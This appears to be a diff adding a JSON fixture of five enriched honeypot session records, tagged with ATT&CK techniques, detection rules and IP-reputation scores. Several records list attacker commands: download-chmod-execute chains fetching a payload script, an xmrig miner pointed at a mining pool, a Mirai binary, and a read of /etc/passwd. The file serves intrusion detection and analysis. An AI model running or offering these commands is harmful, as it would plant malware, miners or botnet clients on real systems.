@@ -1,0 +1,167 @@
+[
+  {
+    "session_id": "a7bcf90c3823",
+    "node_id": "node-blr-01",
+    "protocol": "ssh",
+    "src_ip": "185.220.101.5",
+    "duration_seconds": 32.850392,
+    "credential_attempts": 3,
+    "commands": [
+      "whoami",
+      "uname -a",
+      "cat /etc/passwd",
+      "wget http://malicious.example/payload.sh",
+      "chmod +x payload.sh",
+      "./payload.sh"
+    ],
+    "files_downloaded": 1,
+    "attack_type": "malware_deployment",
+    "severity": "high",
+    "attck_technique_ids": [
+      "T1059.004",
+      "T1105",
+      "T1082",
+      "T1110"
+    ],
+    "matched_rules": [
+      "download_chmod_execute_pattern",
+      "recon_command_pattern",
+      "repeated_credential_attempts"
+    ],
+    "abuseipdb_confidence": 81,
+    "abuseipdb_categories": [
+      "SSH",
+      "Brute-Force"
+    ],
+    "greynoise_classification": "noise",
+    "record_hash": "1ad5b59d376492bacdff4218a1ab6c9ca1c1e0ab92b08fd4f31e157cb595e915",
+    "source_log": "sample_cowrie_session.json"
+  },
+  {
+    "session_id": "f2e91d0a55b1",
+    "node_id": "node-blr-01",
+    "protocol": "telnet",
+    "src_ip": "45.83.12.9",
+    "duration_seconds": 30.681882,
+    "credential_attempts": 2,
+    "commands": [
+      "wget http://185.199.108.1/xmrig -O /tmp/xmrig",
+      "chmod +x /tmp/xmrig",
+      "/tmp/xmrig -o stratum+tcp://pool.moneroocean.stream:10128 -u 4Axxxx"
+    ],
+    "files_downloaded": 1,
+    "attack_type": "cryptominer_installation",
+    "severity": "critical",
+    "attck_technique_ids": [
+      "T1496",
+      "T1059.004",
+      "T1105"
+    ],
+    "matched_rules": [
+      "cryptominer_signature_match",
+      "download_chmod_execute_pattern"
+    ],
+    "abuseipdb_confidence": 63,
+    "abuseipdb_categories": [
+      "Port Scan"
+    ],
+    "greynoise_classification": "noise",
+    "record_hash": "c81c41f1d2507236e3cad1719e40ec2bf7c18a5a8df287c5484157ded5048cc2",
+    "source_log": "sample_cowrie_session_2.json"
+  },
+  {
+    "session_id": "b3c7a19e4d02",
+    "node_id": "node-blr-01",
+    "protocol": "ssh",
+    "src_ip": "103.224.182.19",
+    "duration_seconds": 22.55039,
+    "credential_attempts": 1,
+    "commands": [
+      "whoami",
+      "uname -a",
+      "ifconfig",
+      "ps aux",
+      "netstat -an"
+    ],
+    "files_downloaded": 0,
+    "attack_type": "reconnaissance",
+    "severity": "medium",
+    "attck_technique_ids": [
+      "T1082"
+    ],
+    "matched_rules": [
+      "recon_command_pattern"
+    ],
+    "abuseipdb_confidence": 89,
+    "abuseipdb_categories": [
+      "SSH",
+      "Brute-Force"
+    ],
+    "greynoise_classification": "unknown",
+    "record_hash": "9c3035ed4379909ead51402229f65b7604dfb5911833b388d1e58893b6b0ca5a",
+    "source_log": "sample_cowrie_session_3.json"
+  },
+  {
+    "session_id": "d91fa04c7e12",
+    "node_id": "node-blr-02",
+    "protocol": "telnet",
+    "src_ip": "198.51.100.23",
+    "duration_seconds": 33.78482,
+    "credential_attempts": 2,
+    "commands": [
+      "cat /proc/mounts",
+      "/bin/busybox wget http://185.199.108.44/mirai.arm -O /tmp/.mirai",
+      "chmod +x /tmp/.mirai",
+      "/tmp/.mirai"
+    ],
+    "files_downloaded": 1,
+    "attack_type": "botnet_recruitment",
+    "severity": "critical",
+    "attck_technique_ids": [
+      "T1071",
+      "T1584",
+      "T1059.004",
+      "T1105",
+      "T1082"
+    ],
+    "matched_rules": [
+      "botnet_signature_match",
+      "download_chmod_execute_pattern",
+      "recon_command_pattern"
+    ],
+    "abuseipdb_confidence": 88,
+    "abuseipdb_categories": [
+      "SSH",
+      "Brute-Force"
+    ],
+    "greynoise_classification": "noise",
+    "record_hash": "4fc9d2228d4ae1c8b9344d8b76160ac83d05283a7df1c7d0a61ba540ad4f9856",
+    "source_log": "sample_cowrie_session_4.json"
+  },
+  {
+    "session_id": "e04c8b21f9a3",
+    "node_id": "node-blr-02",
+    "protocol": "ssh",
+    "src_ip": "192.0.2.88",
+    "duration_seconds": 10.55039,
+    "credential_attempts": 4,
+    "commands": [],
+    "files_downloaded": 0,
+    "attack_type": "credential_brute_force",
+    "severity": "low",
+    "attck_technique_ids": [
+      "T1110"
+    ],
+    "matched_rules": [
+      "repeated_credential_attempts"
+    ],
+    "abuseipdb_confidence": 93,
+    "abuseipdb_categories": [
+      "SSH",
+      "Brute-Force"
+    ],
+    "greynoise_classification": "noise",
+    "record_hash": "f5f2eb80fb3f0842c6dc40d6978ca8dce4558b702af6194856ffbc860d8cbd00",
+    "source_log": "sample_cowrie_session_5.json"
+  }
+]
